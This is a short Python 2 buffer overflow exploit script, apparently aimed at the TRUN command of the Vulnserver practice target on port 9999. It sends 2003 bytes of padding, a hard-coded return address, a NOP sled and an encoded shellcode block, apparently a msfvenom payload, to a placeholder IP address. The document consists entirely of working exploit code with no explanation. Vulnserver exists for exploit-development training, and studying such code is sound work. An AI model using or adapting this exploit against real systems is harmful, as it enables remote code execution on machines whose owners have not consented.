#!/usr/bin/python
import sys, socket

bof = ("\xdb\xc6\xd9\x74\x24\xf4\xb8\x51\x73\x0e\x74\x5b\x33\xc9\xb1"
"\x52\x31\x43\x17\x03\x43\x17\x83\xba\x8f\xec\x81\xc0\x98\x73"
"\x69\x38\x59\x14\xe3\xdd\x68\x14\x97\x96\xdb\xa4\xd3\xfa\xd7"
"\x4f\xb1\xee\x6c\x3d\x1e\x01\xc4\x88\x78\x2c\xd5\xa1\xb9\x2f"
"\x55\xb8\xed\x8f\x64\x73\xe0\xce\xa1\x6e\x09\x82\x7a\xe4\xbc"
"\x32\x0e\xb0\x7c\xb9\x5c\x54\x05\x5e\x14\x57\x24\xf1\x2e\x0e"
"\xe6\xf0\xe3\x3a\xaf\xea\xe0\x07\x79\x81\xd3\xfc\x78\x43\x2a"
"\xfc\xd7\xaa\x82\x0f\x29\xeb\x25\xf0\x5c\x05\x56\x8d\x66\xd2"
"\x24\x49\xe2\xc0\x8f\x1a\x54\x2c\x31\xce\x03\xa7\x3d\xbb\x40"
"\xef\x21\x3a\x84\x84\x5e\xb7\x2b\x4a\xd7\x83\x0f\x4e\xb3\x50"
"\x31\xd7\x19\x36\x4e\x07\xc2\xe7\xea\x4c\xef\xfc\x86\x0f\x78"
"\x30\xab\xaf\x78\x5e\xbc\xdc\x4a\xc1\x16\x4a\xe7\x8a\xb0\x8d"
"\x08\xa1\x05\x01\xf7\x4a\x76\x08\x3c\x1e\x26\x22\x95\x1f\xad"
"\xb2\x1a\xca\x62\xe2\xb4\xa5\xc2\x52\x75\x16\xab\xb8\x7a\x49"
"\xcb\xc3\x50\xe2\x66\x3e\x33\xcd\xdf\x48\x43\xa5\x1d\x48\x56"
"\x85\xab\xae\x32\xf9\xfd\x79\xab\x60\xa4\xf1\x4a\x6c\x72\x7c"
"\x4c\xe6\x71\x81\x03\x0f\xff\x91\xf4\xff\x4a\xcb\x53\xff\x60"
"\x63\x3f\x92\xee\x73\x36\x8f\xb8\x24\x1f\x61\xb1\xa0\x8d\xd8"
"\x6b\xd6\x4f\xbc\x54\x52\x94\x7d\x5a\x5b\x59\x39\x78\x4b\xa7"
"\xc2\xc4\x3f\x77\x95\x92\xe9\x31\x4f\x55\x43\xe8\x3c\x3f\x03"
"\x6d\x0f\x80\x55\x72\x5a\x76\xb9\xc3\x33\xcf\xc6\xec\xd3\xc7"
"\xbf\x10\x44\x27\x6a\x91\x64\xca\xbe\xec\x0c\x53\x2b\x4d\x51"
"\x64\x86\x92\x6c\xe7\x22\x6b\x8b\xf7\x47\x6e\xd7\xbf\xb4\x02"
"\x48\x2a\xba\xb1\x69\x7f")

shellcode = "A"*2003 + "\xaf\x11\x50\x62" + "\x90"*32 + bof

try:
		s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
		s.connect(('ip addr' , 9999))

		s.send(("TRUN /.:/" + shellcode))
		s.close()

except:
		
		print "Error connecting to server"
		sys.exit()


